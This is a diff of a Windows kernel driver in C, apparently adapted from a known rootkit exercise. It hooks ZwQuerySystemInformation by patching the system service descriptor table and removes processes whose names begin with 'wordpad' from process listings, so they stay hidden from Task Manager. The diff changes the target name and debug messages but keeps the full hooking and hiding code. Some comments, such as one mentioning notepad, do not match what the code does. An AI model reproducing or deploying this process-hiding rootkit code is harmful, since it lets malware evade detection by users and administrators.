@@ -93,7 +93,7 @@ LARGE_INTEGER					m_KernelTime;
 //
 // ZwQuerySystemInformation() returns a linked list of processes.
 // The function below imitates it, except it removes from the list any
-// process who's name begins with "note".
+// process who's name begins with "wordpad".
 
 NTSTATUS NewZwQuerySystemInformation(
             IN ULONG SystemInformationClass,
@@ -115,21 +115,20 @@ NTSTATUS NewZwQuerySystemInformation(
       // Asking for a file and directory listing
       if(SystemInformationClass == 5)
       {
-	     // This is a query for the process list.
-		 // Look for process names that start with
-		 // '_root_' and filter them out.
 					
 		 struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
          struct _SYSTEM_PROCESSES *prev = NULL;
 		 
 		 while(curr)
 		 {
-            DbgPrint("Current item is %x\n", curr);
-            DbgPrint("Current item name: %s",curr->ProcessName.Buffer);
+            //DbgPrint("Current item is %x\n", curr);
+            //DbgPrint("Current item name: %ws\n\n",curr->ProcessName.Buffer);
 			if (curr->ProcessName.Buffer != NULL)
 			{
-				if(0 == memcmp(curr->ProcessName.Buffer, L"_root_", 12))
+				//filtering notepad.exe
+				if(0 == memcmp(curr->ProcessName.Buffer, L"wordpad", 14))
 				{
+					DbgPrint("[HOOK-zw?SysInfo-MDL]:%ws gets out of taskmgr.exe\n",curr->ProcessName.Buffer);
 					m_UserTime.QuadPart += curr->UserTime.QuadPart;
 					m_KernelTime.QuadPart += curr->KernelTime.QuadPart;
 
@@ -180,7 +179,7 @@ NTSTATUS NewZwQuerySystemInformation(
 
 VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
 {
-   DbgPrint("ROOTKIT: OnUnload called\n");
+   DbgPrint("[HOOK-zw?SysInfo]: OnUnload called\n");
 
    // unhook system calls
    UNHOOK_SYSCALL( ZwQuerySystemInformation, OldZwQuerySystemInformation, NewZwQuerySystemInformation );
@@ -206,14 +205,13 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject,
    // using.
    m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
 
-  DbgPrint("save old system call locations\n");
+  DbgPrint("[HOOK-zw?SysInfo]:save old system call locations\n");
    // save old system call locations
    OldZwQuerySystemInformation =(ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));
 
    // Map the memory into our domain so we can change the permissions on the MDL
    g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4);
    if(!g_pmdlSystemCall){
-      DbgPrint("new MDL was created successfully.\n");
       return STATUS_UNSUCCESSFUL;
    }
 
@@ -225,7 +223,6 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject,
    MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);
 
    // hook system calls
-   DbgPrint("hook ZwQuerySystemInformation with NewZwQuerySystemInformation\n");
    HOOK_SYSCALL( ZwQuerySystemInformation, NewZwQuerySystemInformation, OldZwQuerySystemInformation );
                               
    return STATUS_SUCCESS;
